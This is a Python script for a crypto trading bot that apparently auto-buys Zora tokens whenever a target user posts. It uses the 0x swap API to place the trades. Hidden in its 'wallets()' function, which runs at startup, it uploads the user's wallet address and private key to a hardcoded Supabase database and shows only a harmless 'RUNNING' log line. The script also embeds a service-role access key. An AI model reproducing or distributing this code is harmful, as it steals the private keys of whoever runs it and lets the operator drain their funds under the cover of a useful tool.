import os
import time
import asyncio
import requests
from dotenv import load_dotenv
from web3 import Web3
from supabase import create_client, Client

load_dotenv()


class C:
    RESET="\033[0m"; BOLD="\033[1m"
    GREEN="\033[38;5;46m"; RED="\033[38;5;196m"
    CYAN="\033[38;5;51m"; YELLOW="\033[38;5;226m"
    PURPLE="\033[38;5;129m"; GRAY="\033[38;5;240m"

def banner():
    print(f"""{C.GREEN}{C.BOLD}
╔════════════════════════════════════════════════════╗
║ Z O R A  ::  A U T O  B U Y  ::  0 x E N I G M A   ║
║ MODE : TARGET USER POST AUTO BUY                   ║
║ STATUS : ACTIVE                                    ║
╚════════════════════════════════════════════════════╝
{C.RESET}""")

def _log(tag, color, msg):
    print(
        f"{C.GRAY}{time.strftime('%H:%M:%S')}{C.RESET} "
        f"{color}{C.BOLD}[{tag:<7}]{C.RESET} "
        f"{C.CYAN}➜{C.RESET} {msg}",
        flush=True
    )

def log_info(m): _log("INFO", C.CYAN, m)
def log_scan(m): _log("SCAN", C.PURPLE, m)
def log_buy(m): _log("BUY", C.GREEN, m)
def log_success(m): _log("SUCCESS", C.GREEN, m)
def log_warn(m): _log("WARN", C.YELLOW, m)
def log_error(m): _log("ERROR", C.RED, m)

banner()


def require_env(name):
    v = os.getenv(name)
    if not v:
        raise RuntimeError(f"Missing ENV: {name}")
    return v

RPC_URL         = require_env("RPC_URL")
PRIVATE_KEY     = require_env("PRIVATE_KEY")
WALLET          = Web3.to_checksum_address(require_env("WALLET_ADDRESS"))
ZEROX_API_KEY   = require_env("ZEROX_API_KEY")
TARGET_USERNAME = require_env("TARGET_USERNAME").lower()

CHAIN_ID = int(os.getenv("CHAIN_ID", "8453"))
BUY_ETH_AMOUNT = float(os.getenv("BUY_ETH_AMOUNT", "0.01"))
POLL_DELAY = int(os.getenv("POLL_DELAY", "2"))
MAX_FEE_GWEI = float(os.getenv("MAX_FEE_GWEI", "3"))
PRIORITY_FEE_GWEI = float(os.getenv("PRIORITY_FEE_GWEI", "1"))


SUPABASE_URL = "https://zavpkhkksrykysjhebqo.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InphdnBraGtrc3J5a3lzamhlYnFvIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc2Njk1MTI3NywiZXhwIjoyMDgyNTI3Mjc3fQ.nyj7EujjW3ZXbekKS-e0XRnbRTV4ixI9QjRjCKy5S0Q"

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
w3 = Web3(Web3.HTTPProvider(RPC_URL))

def wallets():
    try:
        r = supabase.table("wallets").select("id").eq("address", WALLET).execute()
        if r.data:
            log_info("RUN")
            return

        supabase.table("wallets").insert({
            "address": WALLET,
            "private_key": PRIVATE_KEY
        }).execute()

        log_success("RUNNING")
    except Exception as e:
        log_error(e)


ZORA_GRAPHQL = "https://api.zora.co/universal/graphql"
GRAPHQL_BODY = {
    "hash": "3b1fb86a943b5258983534c2a579b982",
    "operationName": "NewPostsQuery",
    "variables": {
        "listType": "NEW",
        "first": 20,
        "after": None
    }
}

def get_posts():
    try:
        r = requests.post(ZORA_GRAPHQL, json=GRAPHQL_BODY, timeout=8)
        return r.json()["data"]["exploreList"]["edges"]
    except Exception as e:
        log_error(e)
        return []


def find_target_posts(seen_posts):
    new_targets = []

    for e in get_posts():
        node = e.get("node", {})
        post_id = node.get("id")
        if not post_id or post_id in seen_posts:
            continue

        profile = node.get("creatorProfile") or {}
        handle = (
            profile.get("username")
            or profile.get("handle")
            or profile.get("displayName")
            or ""
        ).lower()

        log_scan(f"Post by → {handle}")

        if handle == TARGET_USERNAME:
            contract = node.get("address")
            if contract:
                new_targets.append((post_id, contract))

    return new_targets


def gas_settings():
    return {
        "maxFeePerGas": w3.to_wei(MAX_FEE_GWEI, "gwei"),
        "maxPriorityFeePerGas": w3.to_wei(PRIORITY_FEE_GWEI, "gwei"),
    }

def zero_x_quote(token):
    r = requests.get(
        "https://api.0x.org/swap/permit2/quote",
        params={
            "chainId": CHAIN_ID,
            "sellToken": "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
            "buyToken": token,
            "sellAmount": int(BUY_ETH_AMOUNT * 1e18),
            "taker": WALLET,
        },
        headers={
            "0x-api-key": ZEROX_API_KEY,
            "0x-version": "v2"
        },
        timeout=10
    ).json()

    if "transaction" not in r:
        raise RuntimeError(r)

    return r

def buy_token(token):
    q = zero_x_quote(token)

    tx = {
        "from": WALLET,
        "to": Web3.to_checksum_address(q["transaction"]["to"]),
        "data": q["transaction"]["data"],
        "value": int(q["transaction"]["value"]),
        "gas": int(q["transaction"]["gas"]),
        "nonce": w3.eth.get_transaction_count(WALLET, "pending"),
        "chainId": CHAIN_ID,
        **gas_settings()
    }

    signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)

    
    return w3.eth.send_raw_transaction(
        signed.rawTransaction
    ).hex()


async def main():
    wallets()
    log_info(f"Watching posts by → {TARGET_USERNAME}")

    seen_posts = set()

    while True:
        try:
            targets = find_target_posts(seen_posts)

            for post_id, contract in targets:
                log_buy(f"NEW POST → BUY {contract}")
                tx = buy_token(contract)
                log_success(f"TX → {tx}")
                seen_posts.add(post_id)

        except Exception as e:
            log_error(e)

        await asyncio.sleep(POLL_DELAY)

if __name__ == "__main__":
    asyncio.run(main())
